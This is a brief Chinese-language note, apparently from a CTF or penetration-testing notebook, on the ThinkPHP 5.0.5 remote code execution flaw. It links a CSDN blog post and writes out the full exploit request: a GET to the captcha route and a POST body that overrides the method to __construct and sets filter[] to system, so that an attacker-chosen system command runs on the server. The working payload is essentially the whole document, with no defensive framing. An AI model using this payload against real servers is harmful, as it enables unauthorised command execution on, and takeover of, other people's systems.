# 知识点
[ThinkPHP5.0.5RCE_1stPeak的博客-CSDN博客_thinkphp5.0.5](https://blog.csdn.net/qq_41617034/article/details/119463580)
# 思路
```php
GET http://xx.xx.xx.xx:8080/index.php/?s=captcha
POST _method=__construct&filter[]=system&method=GET&get[]=系统命令
```
